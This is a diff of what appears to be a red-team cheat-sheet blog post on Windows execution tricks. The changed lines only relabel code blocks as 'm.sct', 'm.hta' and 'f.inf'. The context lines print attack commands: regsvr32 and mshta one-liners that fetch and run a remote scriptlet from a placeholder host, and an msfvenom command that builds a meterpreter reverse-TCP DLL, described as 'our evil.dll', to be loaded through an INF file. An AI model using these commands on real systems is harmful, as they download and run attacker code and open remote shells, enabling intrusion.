@@ -12,7 +12,7 @@ slug: English-Preview
 > <!--more-->
 # regsvr32
 
-Code
+m.sct
 
 ```xml
 <?XML version="1.0"?>
@@ -37,7 +37,7 @@ regsvr32.exe /s /i:http://ip/m.sct scrobj.dll
 
 # MSHTA
 
-Code
+m.sct
 
 ```xml
 <?XML version="1.0"?>
@@ -72,7 +72,7 @@ mshta.exe javascript:a=(GetObject('script:http://ip/m.sct')).Exec();close();
 
 ## HTA
 
-Code
+m.hta
 
 ```html
 <html>
@@ -155,6 +155,8 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=eth0 LPORT=8888 -f dll > /
 ```
 
 Creating a file that will be loaded by CSMTP.exe binary that will in turn load our evil.dll
+
+f.inf
 
 ```ini
 [version]
